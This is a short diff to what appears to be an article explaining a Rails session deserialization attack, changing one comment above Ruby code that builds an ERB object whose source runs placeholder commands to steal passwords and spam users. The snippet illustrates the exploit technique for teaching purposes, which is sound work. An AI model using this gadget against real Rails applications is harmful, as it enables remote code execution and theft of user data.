@@ -77,7 +77,7 @@ This request will load `my_evil_session_hash` into `session`, which is purely on
 {% highlight ruby %}   
     # Thanks to the folks at CodeClimate for pointing this out
 
-    # The code in the ERB will run when the session is accessed
+    # The code in the ERB will run when Rails unserializes it
     erb = ERB.allocate
     erb.instance_variable_set :@src, "User.steal_all_passwords; User.email_spam_to_all_users;"
     
